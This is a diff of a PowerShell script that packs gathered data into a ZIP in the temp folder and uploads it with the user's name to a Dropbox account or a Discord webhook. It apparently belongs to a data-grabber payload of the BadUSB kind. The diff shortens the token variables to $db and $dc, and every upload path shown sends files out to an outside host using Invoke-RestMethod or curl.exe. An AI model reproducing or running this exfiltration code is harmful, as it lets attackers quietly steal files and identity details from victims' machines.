@@ -46,9 +46,9 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 # Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
 
-$DropBoxAccessToken = ""
+#$db = ""
 
-$DiscordAccessToken = ""
+#$dc = ""
 
 ############################################################################################################################################################
 
@@ -518,7 +518,7 @@ function dropbox {
 $TargetFilePath="/$ZIP"
 $SourceFilePath="$env:TEMP\$ZIP"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
+$authorization = "Bearer " + $db
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
@@ -526,7 +526,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($DropBoxAccessToken))){dropbox}
+if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
 
@@ -540,7 +540,7 @@ param (
     [string]$text 
 )
 
-$hookurl = "$DiscordAccessToken"
+$hookurl = "$dc"
 
 $Body = @{
   'username' = $env:username
@@ -553,7 +553,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($DiscordAccessToken))){Upload-Discord -file "$env:tmp/$ZIP"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
  
 
